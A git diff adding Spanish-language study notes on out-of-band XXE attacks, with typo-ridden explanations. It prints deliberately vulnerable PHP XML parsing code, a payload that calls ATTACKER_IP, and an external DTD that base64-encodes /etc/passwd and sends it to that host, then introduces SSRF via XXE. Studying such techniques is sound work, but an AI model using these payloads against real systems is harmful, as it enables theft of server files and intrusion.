@@ -130,4 +130,75 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 </contact>
 ```
 
+![image](https://github.com/user-attachments/assets/41d3d37e-e58a-461a-8788-10d7de918734)
+
+# Explotando XXE-Out-of-Band
+
+En la otra mano demostraremos la vulnerabilidad, que `podemos subir archivos
+
+```
+libxml_disable_entity_loader(false);
+$xmlData = file_get_contents('php://input'); 
+
+$doc = new DOMDocument();
+$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
+
+$links = $doc->getElementsByTagName('file');
+
+foreach ($links as $link) {
+    $fileLink = $link->nodeValue;
+    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
+    $stmt->bind_param("s", $fileLink);
+    $stmt->execute();
+    
+    if ($stmt->affected_rows > 0) {
+        echo "Link saved successfully.";
+    } else {
+        echo "Error saving link.";
+    }
+    
+    $stmt->close();
+}
+```
+
+El código no devuelve los valores de los datos XML, el termino Out-Of-Band es filtrar los datos capturados usando el servidor como ataque
+
+Para este ataque, nosotros necesitamos un servidor para recibir los datos de otros servidores. Podemos usar Python http.server donde hay otra opciones como apache o ngnix para la subida de arhcivos
+
+![image](https://github.com/user-attachments/assets/fdbf2078-effa-49ce-8ff9-613f94a79f7b)
+
+```
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
+<upload><file>&xxe;</file></upload>
+```
+
+![image](https://github.com/user-attachments/assets/332e6378-50c4-4928-9c07-fb31a58713ca)
+
+Despues de modificar la consulta HTTP, el servidor recibira la consulta y se creara un filtro
+
+Ahora podemos crear nuestro propio archivo DTD conteniendo entidades externas para filtrar datos
+
+```
+<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
+%oobxxe;
+```
+
+Explicación
+
+- El inicio comienza con la declaración %cmd los puntos de los recursos del sistema. El %cmd se refiere al recurso cuando el filtro PHP php://Filter. Devuelve el contnid /etc/paswd, en un archivo aextanar, luego lo convierte en base64 codificandolo. La entidad %oobxxe contiene declaraciónes CML, el exfil se usa para identificar los puntos de lssitema y el %cmd rerpesenta el contenido de base64 codificado.
+
+![image](https://github.com/user-attachments/assets/be0e64d1-b9e1-42eb-b026-b10d96cd61ec)
+
+![image](https://github.com/user-attachments/assets/ef04a826-27d9-40d2-be24-1e335a4b81ff)
+
+
+# SSRF + XXE
+
+Server-Side Request Forgery (SSRF) Ocurre cuand oel atacante abusca funcionalidades del servidor, causando al servidor que haga ocnsultas en localizaciones no intencionadas. En el contexto de una XXE, el atacatne manipula input XML para hacer al servidor consultas que no son verdaderos en servicios internos. La técnica se usa para escanear reter internas, acceder a endporint o interactura con serivicos que son accesibles del servidor local
+
+
+
 
